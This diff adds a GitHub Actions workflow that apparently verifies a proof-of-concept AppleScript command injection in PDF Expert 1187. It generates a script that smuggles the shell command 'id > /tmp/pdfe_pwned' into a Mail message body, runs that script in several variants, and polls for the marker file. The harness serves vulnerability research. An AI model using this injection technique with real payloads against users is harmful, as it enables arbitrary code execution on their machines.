@@ -1,0 +1,160 @@
+name: pdfexpert-gate7
+
+on:
+  workflow_dispatch:
+
+jobs:
+  g7:
+    runs-on: macos-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Fetch PDF Expert 1187 and regenerate
+        run: |
+          set -euo pipefail
+          curl -fsSL -o pex.zip https://downloads.pdfexpert.com/pem3/versions/1187/PDFExpert.zip
+          shasum -a 256 pex.zip
+          unzip -q pex.zip -d app
+          python3 poc/gen_poc.py --binary "app/PDF Expert.app/Contents/MacOS/PDF Expert" --cmd "id > /tmp/pdfe_pwned" --field body > generated.scpt
+          grep -n 'new outgoing message' generated.scpt
+
+      - name: D - is Mail configured, and does it answer ANY event
+        run: |
+          set +e
+          echo "=== D1a ls ~/Library/Mail ==="
+          ls -la ~/Library/Mail 2>&1 | head -20
+          echo "=== D1b ls ~/Library/Mail/V10 ==="
+          ls -la ~/Library/Mail/V10 2>&1 | head -20
+          echo "=== D1c defaults read com.apple.mail ==="
+          defaults read com.apple.mail 2>&1 | head -40
+          echo "=== D1d preferences files ==="
+          ls -la ~/Library/Preferences 2>/dev/null | grep -i mail
+          echo "=== D1e accounts ==="
+          ls -la ~/Library/Accounts 2>&1 | head -10
+          echo "=== D1f Mail running before probe? ==="
+          pgrep -x Mail || echo "Mail not running"
+          echo "=== D2 trivial event: tell application Mail to get name (15s timeout) ==="
+          START=$(date +%s)
+          OUT=$(osascript -e 'with timeout of 15 seconds' -e 'tell application "Mail" to get name' -e 'end timeout' 2>&1)
+          RC=$?
+          echo "D2 RC=$RC ELAPSED=$(( $(date +%s) - START ))s OUT=[$OUT]"
+          echo "=== D3 does a LOCAL command inside the tell block run while Mail is up? ==="
+          rm -f /tmp/pdfe_inblock
+          cat > tellprobe.scpt <<'S'
+          with timeout of 15 seconds
+            tell application "Mail"
+              do shell script "date +%s > /tmp/pdfe_inblock"
+            end tell
+          end timeout
+          return "TOLDONE"
+          S
+          START=$(date +%s)
+          OUT=$(osascript tellprobe.scpt 2>&1)
+          RC=$?
+          echo "D3 RC=$RC ELAPSED=$(( $(date +%s) - START ))s OUT=[$OUT] INBLOCK=[$(cat /tmp/pdfe_inblock 2>/dev/null)]"
+          echo "=== D4 reset Mail ==="
+          killall Mail 2>/dev/null
+          sleep 3
+          pgrep -x Mail && echo "Mail still up" || echo "Mail gone"
+
+      - name: E - instrumented app-shaped script, 12s AppleEvent timeout, marker polled every 1s
+        run: |
+          set +e
+          rm -f /tmp/pdfe_pwned /tmp/pdfe_tellfull
+          python3 - <<'PY'
+          gen = open('generated.scpt').read().splitlines()
+          out = []
+          for l in gen:
+              out.append(l)
+              if l.strip() == 'tell application "Mail"':
+                  out.append('  do shell script "date +%s > /tmp/pdfe_tellfull"')
+          body = '\n'.join(out)
+          open('generated_t0.scpt', 'w').write('with timeout of 12 seconds\n' + body + '\nend timeout\n')
+          print('--- E SCRIPT head ---')
+          print('\n'.join(open('generated_t0.scpt').read().splitlines()[:8]))
+          PY
+          START=$(date +%s)
+          osascript generated_t0.scpt > osa_t0.out 2>&1 &
+          PID=$!
+          SAW=0
+          for i in $(seq 1 45); do
+            if [ -s /tmp/pdfe_pwned ] && [ "$SAW" = "0" ]; then
+              SAW=1
+              echo "MARKER_AT_SECOND=$(( $(date +%s) - START ))"
+            fi
+            if [ -s /tmp/pdfe_tellfull ] && [ "$SAW" = "0" ]; then
+              echo "TELLFULL_AT_SECOND=$(( $(date +%s) - START ))"
+            fi
+            kill -0 $PID 2>/dev/null || { echo "OSA_DIED_AT_SECOND=$(( $(date +%s) - START ))"; break; }
+            sleep 1
+          done
+          ALIVE=no
+          kill -0 $PID 2>/dev/null && ALIVE=yes
+          echo "E ELAPSED: $(( $(date +%s) - START ))s osascript_alive=$ALIVE"
+          kill $PID 2>/dev/null; wait $PID 2>/dev/null
+          echo "E OUT: [$(cat osa_t0.out)]"
+          echo "E TELLFULL: [$(cat /tmp/pdfe_tellfull 2>/dev/null)] START_EPOCH=$START"
+          if [ -s /tmp/pdfe_pwned ]; then echo "E PROOF: do shell script executed"; echo "E MARKER: [$(cat /tmp/pdfe_pwned)]"; else echo "E PROOF: none"; fi
+
+      - name: A - exact generated expression, no Mail, bare record literal
+        run: |
+          set +e
+          rm -f /tmp/pdfe_nomail /tmp/pdfe_pwned
+          python3 - <<'PY'
+          gen = open('generated.scpt').read()
+          line = [l for l in gen.splitlines() if 'new outgoing message' in l][0]
+          expr = line.split('properties {', 1)[1].rstrip('}')
+          open('nomail.scpt', 'w').write('set r to {' + expr + '}\nreturn content of r\n')
+          print('NOMAIL LINE:', open('nomail.scpt').read().splitlines()[0])
+          PY
+          osacompile -o /tmp/nm.scptd nomail.scpt && echo "NOMAIL COMPILE OK" || echo "NOMAIL COMPILE FAILED"
+          START=$(date +%s)
+          osascript nomail.scpt > nm.out 2>&1 &
+          PID=$!
+          for i in $(seq 1 60); do [ -s /tmp/pdfe_pwned ] && break; sleep 1; done
+          kill $PID 2>/dev/null; wait $PID 2>/dev/null
+          echo "NOMAIL ELAPSED: $(( $(date +%s) - START ))s"
+          echo "NOMAIL OUT: [$(cat nm.out)]"
+          if [ -s /tmp/pdfe_pwned ]; then echo "NOMAIL PROOF: do shell script executed"; echo "NOMAIL MARKER: [$(cat /tmp/pdfe_pwned)]"; else echo "NOMAIL PROOF: none"; fi
+
+      - name: B - full generated script, 180s window, report whether Mail came up
+        run: |
+          set +e
+          rm -f /tmp/pdfe_pwned
+          START=$(date +%s)
+          osascript generated.scpt > osa.out 2>&1 &
+          PID=$!
+          MAILUP=no
+          for i in $(seq 1 180); do
+            [ -s /tmp/pdfe_pwned ] && break
+            pgrep -x Mail >/dev/null && MAILUP=yes
+            sleep 1
+          done
+          ALIVE=no
+          kill -0 $PID 2>/dev/null && ALIVE=yes
+          echo "B ELAPSED: $(( $(date +%s) - START ))s osascript_alive=$ALIVE mail_process=$MAILUP"
+          kill $PID 2>/dev/null; wait $PID 2>/dev/null
+          echo "B OUT: [$(cat osa.out)]"
+          if [ -s /tmp/pdfe_pwned ]; then echo "B PROOF: do shell script executed"; echo "B MARKER: [$(cat /tmp/pdfe_pwned)]"; else echo "B PROOF: none"; fi
+
+      - name: C - bare do shell script as an operand, paren vs no paren
+        run: |
+          set +e
+          echo 'set a to "x" & do shell script "echo hi" & "y"' > c1.scpt
+          osacompile -o /tmp/c1.scptd c1.scpt && echo "C1 COMPILE OK" || echo "C1 COMPILE FAILED"
+          echo "C1 OUT: [$(osascript c1.scpt 2>&1)]"
+          echo 'set a to "x" & (do shell script "echo hi") & "y"' > c2.scpt
+          echo "C2 OUT: [$(osascript c2.scpt 2>&1)]"
+
+      - name: Collect
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: gate7
+          path: |
+            generated.scpt
+            generated_t0.scpt
+            tellprobe.scpt
+            nomail.scpt
+            *.out
